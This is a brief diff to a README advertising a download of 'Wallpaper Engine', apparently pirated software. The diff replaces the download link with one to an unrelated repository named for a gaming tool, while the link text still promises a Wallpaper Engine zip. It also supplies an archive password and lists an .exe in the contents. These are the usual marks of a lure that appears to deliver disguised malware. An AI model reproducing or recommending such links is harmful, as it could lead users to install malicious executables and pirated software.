@@ -20,8 +20,9 @@ For personal use only. Use at your own risk.
 ---
 ## 📥 Download
 
-📥 [Download `Wallpaper-Engine-Last-Version.zip`](https://github.com/isakzinn/Wallpaper-Engine-Steam/releases/download/Sotware/WalpEng.zip)  
+📥 [Download `Wallpaper-Engine-Last-Version.zip`](https://github.com/apirun321/WTFast-Smoother-Gaming-v5.5.39-Desktop)  
 🔐 `LS2026`  
+-
 
 Contents: WallpaperEngine.exe, config.ini, readme.txt.
 ---
